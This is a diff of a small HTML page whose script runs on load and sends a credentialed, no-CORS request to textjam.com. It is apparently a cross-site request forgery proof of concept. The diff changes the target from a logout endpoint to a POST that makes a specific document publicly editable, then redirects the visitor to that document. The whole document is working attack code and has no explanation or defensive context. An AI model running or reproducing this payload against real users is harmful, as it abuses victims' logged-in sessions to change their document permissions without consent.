@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <script>
 // Auto-execute on page load
-fetch('https://textjam.com/api/auth/logout', {
-    method: 'GET',
+fetch('https://textjam.com/api/doc/U81M7E5V/access/public/editor', {
+    method: 'POST',
     credentials: 'include',  // Send cookies
     mode: 'no-cors'         // Bypass CORS
 }).catch(() => {}); // Ignore errors
 
 // Redirect immediately
 setTimeout(() => {
-    window.location.href = 'https://textjam.com';
+    window.location.href = 'https://textjam.com/doc/U81M7E5V';
 }, 300);
 </script>
 
